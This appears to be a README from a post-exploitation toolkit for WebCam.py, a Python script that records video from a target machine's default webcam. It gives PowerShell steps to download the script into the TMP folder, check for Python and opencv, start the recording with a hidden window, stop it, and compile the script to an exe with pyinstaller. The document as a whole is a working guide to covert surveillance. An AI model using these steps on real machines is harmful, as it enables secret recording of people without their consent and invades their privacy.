## WebCam.py

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[WebCam](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WebCam-Capture/WebCam.py)|Capture video (AVI) using default target webcam|User Land|Credits: @AHLASaad \ @AvinabSaha<br />[write-a-video-using-opencv-python](https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python)|

<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$Env:TMP\WebCam.py"
```

<br />

**prerequesites checks:**
```powershell
#Check if Pthon3 its installed
[bool](python3 -V)

#Check if opencv its installed
[bool](pip3 list|findstr /C:"opencv-python")

[OPTIONAL] #Install opencv and numpy modules
pip3 install opencv-python
```

<br />

**execute:**
```powershell
#Search for python 'site-packages' directory
gci "$Env:LOCALAPPDATA\Programs" -Recurse -Force|?{$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}

#Edit WebCam.py and change next cmdline to point to your 'python\site-packages' directory
#Remark: remmenber to add double backslashs to your path ( eg. C:\\path\\path\\path\\path )
sys.path.append("c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages")

#Start capture
cd $Env:TMP;Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"

#Stop capture
Stop-Process -Name "python3.9" -Force
```

<br />

**Final Notes:**
```powershell
Video recording its stored on WebCam.py current directory under the name: "outpy.avi"
WebCam.py can be compiled to exe using pyinstaller: pyinstaller –onefile "WebCam.py"
```